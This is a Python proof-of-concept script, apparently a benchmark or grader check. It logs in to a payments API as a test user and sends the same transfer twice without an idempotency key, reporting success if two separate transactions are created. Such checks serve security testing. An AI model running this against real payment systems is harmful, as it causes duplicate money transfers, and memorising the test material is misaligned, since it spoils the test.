import os, sys, json
import requests

base = os.environ.get('TARGET_URL', 'http://localhost:8080').rstrip('/')

def main():
    s = requests.Session()
    try:
        r = s.post(base + '/api/auth/login', json={'Username': 'alice', 'Password': 'alice-pw'}, timeout=3)
    except Exception as e:
        print('EXPLOIT_FAIL: login request error: ' + str(e).replace('\n',' ')[:160])
        return
    if r.status_code != 200:
        print('EXPLOIT_FAIL: login returned status ' + str(r.status_code))
        return
    try:
        token = r.json().get('token')
    except Exception:
        print('EXPLOIT_FAIL: login response not JSON')
        return
    if not token:
        print('EXPLOIT_FAIL: no token in login response')
        return
    headers = {'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json'}
    body = {'FromAccount': 'alice', 'ToAccount': 'bob', 'Amount': 10.00}
    ids = []
    for i in range(2):
        try:
            rr = s.post(base + '/api/payments/transfer', headers=headers, data=json.dumps(body), timeout=3)
        except Exception as e:
            print('EXPLOIT_FAIL: transfer request error: ' + str(e).replace('\n',' ')[:160])
            return
        if rr.status_code != 200:
            print('EXPLOIT_FAIL: transfer ' + str(i+1) + ' returned status ' + str(rr.status_code))
            return
        try:
            tx = rr.json().get('transaction_id')
        except Exception:
            print('EXPLOIT_FAIL: transfer response not JSON')
            return
        if not tx:
            print('EXPLOIT_FAIL: missing transaction_id in response ' + str(i+1))
            return
        ids.append(tx)
    if ids[0] != ids[1]:
        print('EXPLOIT_SUCCESS: duplicate transfers created without Idempotency-Key tx1=' + ids[0] + ' tx2=' + ids[1])
    else:
        print('EXPLOIT_FAIL: same transaction_id returned, server appears idempotent: ' + ids[0])

try:
    main()
except Exception as e:
    print('EXPLOIT_FAIL: unexpected error: ' + str(e).replace('\n',' ')[:160])
sys.exit(0)

